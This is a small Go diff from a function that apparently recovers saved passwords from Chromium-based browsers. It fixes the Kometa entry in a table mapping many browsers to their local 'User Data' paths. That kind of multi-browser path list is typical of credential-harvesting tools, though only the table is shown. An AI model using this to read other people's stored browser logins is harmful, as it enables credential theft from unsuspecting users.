@@ -141,7 +141,7 @@ func Recovery_passwords_chromes() map[string][]Logins_table_struct {
 	browser_map["Iridium Browser"] = Browser_info{Browser_path: Local_appdata + "\\Iridium\\User Data", Need_to_recovery: true}
 	browser_map["Torch Browser"] = Browser_info{Browser_path: Local_appdata + "\\Torch\\User Data", Need_to_recovery: true}
 	browser_map["Liebao Browser"] = Browser_info{Browser_path: Local_appdata + "\\liebao\\User Data", Need_to_recovery: true}
-	browser_map["Kometa"] = Browser_info{Browser_path: Local_appdata + "\\liebao\\User Data", Need_to_recovery: true} //mistake
+	browser_map["Kometa"] = Browser_info{Browser_path: Local_appdata + "\\Kometa\\User Data", Need_to_recovery: true} //mistake
 	browser_map["Elements Browser"] = Browser_info{Browser_path: Local_appdata + "\\Elements Browser\\User Data", Need_to_recovery: true}
 	browser_map["QIP Surf"] = Browser_info{Browser_path: Local_appdata + "\\QIP Surf\\User Data", Need_to_recovery: true}
 	browser_map["Sputnik"] = Browser_info{Browser_path: Local_appdata + "\\Sputnik\\Sputnik\\User Data", Need_to_recovery: true}
